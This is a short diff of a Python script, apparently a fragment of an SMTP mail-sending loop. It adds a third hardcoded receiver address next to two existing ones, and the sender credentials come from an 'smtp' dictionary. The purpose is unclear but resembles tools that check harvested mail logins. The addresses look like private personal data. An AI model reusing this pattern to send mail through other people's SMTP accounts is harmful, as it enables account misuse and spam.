@@ -362,6 +362,7 @@ for x in range(1):
 	if smtp['ready'] == True:
 		receiver_email = "adamoyler2705cc@web.de"
 		receiver_email = "kamlal.fahmi@yahoo.com"
+		receiver_email = "adamhardison284@gmail.com"
 		sender_email = smtp['username']
 		password = smtp['pass']
 		for y in range(1):
